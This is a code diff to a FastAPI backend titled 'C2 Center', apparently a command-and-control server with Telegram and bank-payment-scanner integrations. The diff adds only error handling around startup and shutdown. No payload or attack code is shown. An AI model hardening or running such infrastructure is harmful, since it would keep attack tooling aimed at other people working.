@@ -14,21 +14,36 @@ from app.mbbank import get_mb, mb_payment_scanner
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    await init_redis()
-    async with engine.begin() as conn:
-        await conn.run_sync(Base.metadata.create_all)
-    print(f"🚀 C2 Server running on {settings.C2_HOST}:{settings.C2_PORT}")
+    try:
+        await init_redis()
+    except Exception as e:
+        print(f"[Redis] init failed (continuing): {e}")
+    try:
+        async with engine.begin() as conn:
+            await conn.run_sync(Base.metadata.create_all)
+        print("[DB] tables ready")
+    except Exception as e:
+        print(f"[DB] create_all failed (continuing): {e}")
+    print(f"C2 Server running on {settings.C2_HOST}:{settings.C2_PORT}")
     try:
         await init_telegram()
     except Exception as e:
         print(f"[Telegram] Init failed: {e}")
-    # Start MB scanner if service or credentials configured
-    if settings.MB_SERVICE_URL or (settings.MB_USERNAME and settings.MB_PASSWORD):
-        asyncio.create_task(mb_payment_scanner())
-        print("[MB] Payment scanner scheduled")
+    try:
+        if settings.MB_SERVICE_URL or (settings.MB_USERNAME and settings.MB_PASSWORD):
+            asyncio.create_task(mb_payment_scanner())
+            print("[MB] Payment scanner scheduled")
+    except Exception as e:
+        print(f"[MB] scanner schedule failed: {e}")
     yield
-    await close_redis()
-    await engine.dispose()
+    try:
+        await close_redis()
+    except Exception:
+        pass
+    try:
+        await engine.dispose()
+    except Exception:
+        pass
 
 app = FastAPI(title="C2 Center", version="4.0.0", lifespan=lifespan, docs_url=None, redoc_url=None)
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
